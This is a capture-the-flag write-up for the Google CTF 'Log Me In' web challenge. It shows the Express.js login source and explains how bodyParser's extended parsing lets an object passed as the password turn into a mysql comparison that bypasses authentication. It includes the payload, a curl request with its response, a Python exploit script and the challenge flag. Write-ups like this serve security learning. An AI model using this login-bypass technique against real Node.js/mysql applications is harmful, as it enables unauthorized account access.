<h1>Log Me In</h1>

<p>Author: <a href="https://github.com/roerohan">roerohan</a></p>

<h1>Requirements</h1>

<ul>
<li>Express.js</li>
<li>Body Parser</li>
</ul>

<h1>Source</h1>

<ul>
<li>https://log-me-in.web.ctfcompetition.com/</li>
</ul>

<p><code>
Log in to get the flag
</code></p>

<p>```js
/**
 * @fileoverview Description of this file.
 */</p>

<p>const mysql = require('mysql');
const express = require('express');
const cookieSession = require('cookie-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');</p>

<p>const flagValue = "..."
const targetUser = "michelle"</p>

<p>const {
  v4: uuidv4
} = require('uuid');</p>

<p>const app = express();
app.set('view engine', 'ejs');
app.set('strict routing', true);</p>

<p>/* strict routing to prevent /note/ paths etc. */
app.set('strict routing', true)
app.use(cookieParser());</p>

<p>/* secure session in cookie */
app.use(cookieSession({
  name: 'session',
  keys: ['...'] //don't even bother
}));</p>

<p>app.use(bodyParser.urlencoded({
  extended: true
}))</p>

<p>app.use(function(req, res, next) {
  if(req &amp;&amp; req.session &amp;&amp; req.session.username) {
    res.locals.username = req.session.username
    res.locals.flag = req.session.flag
  } else {
    res.locals.username = false
    res.locals.flag = false
  }
  next()
});</p>

<p>/* server static files from static folder */
app.use('/static', express.static('static'))</p>

<p>app.use(function( req, res, next) {
  if(req.get('X-Forwarded-Proto') == 'http') {
      res.redirect('https://' + req.headers.host + req.url)
  } else {
    if (process.env.DEV) {
      return next()
    } else  {
    return next()
    }
  }
});
// MIDDLEWARE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>

<p>/* csrf middleware, csrf_token stored in the session cookie */
const csrf = (req, res, next) =&gt; {
  const csrf = uuidv4();
  req.csrf = req.session.csrf || uuidv4();
  req.session.csrf = csrf;
  res.locals.csrf = csrf;</p>

<p>nocache(res);</p>

<p>if (req.method == 'POST' &amp;&amp; req.csrf !== req.body.csrf) {
    return res.render('index', {error: 'Invalid CSRF token'});
  }</p>

<p>next();
}</p>

<p>/* disable cache on specifc endpoints */
const nocache = (res) =&gt; {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
}</p>

<p>/* auth middleware */
const auth = (req, res, next) =&gt; {
  if (!req.session || !req.session.username) {
    return res.render('index', {error:"You must be logged in to access that"});
  }
  next()
}</p>

<p>// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`
app.get('/logout', (req, res) =&gt; {
  req.session = null;
  res.redirect('/');
});</p>

<p>app.get('/', csrf, (req, res) =&gt; {
  res.render('index');
});</p>

<p>app.get('/about', (req, res) =&gt; {
  res.render('about');</p>

<p>});
app.get('/me', auth, (req, res) =&gt; {
  res.render('profile');
});</p>

<p>app.get('/flag', csrf, auth, (req, res) =&gt; {
  res.render('premium')
});</p>

<p>app.get('/login', (req, res) =&gt; {
  res.render('login');
});</p>

<p>app.post('/login', (req, res) =&gt; {
  const u = req.body['username'];
  const p = req.body['password'];</p>

<p>const con = DBCon(); // mysql.createConnection(...).connect()</p>

<p>const sql = 'Select * from users where username = ? and password = ?';
  con.query(sql, [u, p], function(err, qResult) {
    if(err) {
      res.render('login', {error: <code>Unknown error: ${err}</code>});
    } else if(qResult.length) {
      const username = qResult[0]['username'];
      let flag;
      if(username.toLowerCase() == targetUser) {
        flag = flagValue
      } else{
        flag = "<span class=text-danger>Only Michelle's account has the flag</span>";
      }
      req.session.username = username
      req.session.flag = flag
      res.redirect('/me');
    } else {
      res.render('login', {error: "Invalid username or password"})
    }
  });
});</p>

<p>/*
 * ...SNIP...
 */</p>

<p>```</p>

<h1>Exploitation</h1>

<p>When you look at the source code, you'll notice the following snippet:</p>

<p><code>js
app.use(bodyParser.urlencoded({
  extended: true
}))
</code></p>

<p>This tells body parser to allow arrays and objects in the request body. So you can pass things like:</p>

<p>```
username[]=a&amp;username[]=b</p>

<p>This is interpreted as username = ['a', 'b']</p>

<p>Similarly, </p>

<p>username[hello]=a</p>

<p>Is interpreted as username = {hello: 'a'}
```</p>

<p>Now, you see in the <code>/login</code> POST route that the output has not been stringified (no <code>.toString()</code>). Which means it is possible to pass an object in the query statement.</p>

<p><code>js
const sql = 'Select * from users where username = ? and password = ?';
con.query(sql, [u, p], function(err, qResult) {...});
</code></p>

<p>Now, let's see if passing an objectto the <code>con.query</code> function might help us. We'll refer to the official <code>mysql</code> <a href="https://www.npmjs.com/package/mysql#escaping-query-values">docs</a>.</p>

<p>Take a look at this example:</p>

<p><code>js
var post  = {id: 1, title: 'Hello MySQL'};
var query = connection.query('INSERT INTO posts SET ?', post, function (error, results, fields) {
  if (error) throw error;
  // Neat!
});
console.log(query.sql); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
</code></p>

<p>We can see that objects are converted into comma separated attributes. We know that the username is supposed to be <code>michelle</code>, but we do not know the password. So, we can try to pass an object in the place of password, with a known attribute. Here's the payload I tried:</p>

<p><code>
csrf&amp;username=michelle&amp;password[username]=michelle
</code></p>

<p>This makes <code>password</code> an object as shown below:</p>

<p><code>js
{
  username: 'michelle',
}
</code></p>

<p>Now, the query becomes something like:</p>

<p><code>js
con.query('Select * from users where username = ? and password = ?', ['michelle', {username: 'michelle'}], function(err, qResult) {...});
</code></p>

<p>This actually evaluates to:</p>

<p><code>js
"Select * from users where username = 'michelle' and password = `username` = 'michelle';"
</code></p>

<p>This works because of the way <code>mysql</code> evaluates strings. When you evaluate <code>'password' = 'username'</code>, it returns a 0. Then, if you compare <code>0</code> and <code>'michelle'</code>, <code>true</code> is returned. This happens because of the way type-casting is done in <code>mysql</code>. 
<br /></p>

<p>This exploit would work for any string (not just <code>michelle</code>) except the ones which get type-casted to a different number.
<br /></p>

<p>For example, <code>0 = '1michelle'</code> will evaluate to false, since <code>1michelle</code> when converted to an integer gives <code>1</code>. Therefore, <code>password[username] = 1michelle</code> will not allow you to log in successfully. Check out <a href="https://stackoverflow.com/questions/22080382/mysql-why-comparing-a-string-to-0-gives-true">this</a> link for a more detailed explanation.
<br /></p>

<p>Here's the final paylaod.</p>

<p>```bash
curl -i -X POST --data 'csrf&amp;username=michelle&amp;password[username]=michelle' "https://log-me-in.web.ctfcompetition.com/login"</p>

<p>HTTP/2 302 
content-type: text/plain; charset=utf-8
x-powered-by: Express
location: /me
vary: Accept
set-cookie: session=eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9; path=/; httponly
set-cookie: session.sig=bm5eHrmgRjBNmerS49mKNDV_tP4; path=/; httponly
x-cloud-trace-context: 51c2e656058a1cc31a265b3a8ad0d4b1
date: Mon, 24 Aug 2020 06:53:43 GMT
server: Google Frontend
content-length: 25</p>

<p>Found. Redirecting to /me
```</p>

<p>From here, you can just take the cookie you received, and use that to visit <code>/flag</code>.
<br /></p>

<p>P.S. you can write a python script for the exploit, like the one given below:</p>

<p>```py
import requests
import re</p>

<p>url = lambda path: 'https://log-me-in.web.ctfcompetition.com' + path</p>

<p>s = requests.Session()</p>

<p>payload = {
    "username": "michelle",
    "password[username]": "michelle",
    "csrf": "",
}</p>

<p>r = s.post(url('/login'), data=payload)</p>

<p>r = s.get(url('/flag'))</p>

<p>if re.search(r'CTF{.*}', r.text):
    print(r.text)</p>

<p>```</p>

<p>You can run this script and use <code>grep</code> to find the flag.</p>

<p><code>bash
$ python solve.py | grep CTF
        &lt;p&gt;Flag: CTF{a-premium-effort-deserves-a-premium-flag}&lt;/p&gt;
</code></p>

<p>The flag is:</p>

<p><code>
CTF{a-premium-effort-deserves-a-premium-flag}
</code></p>
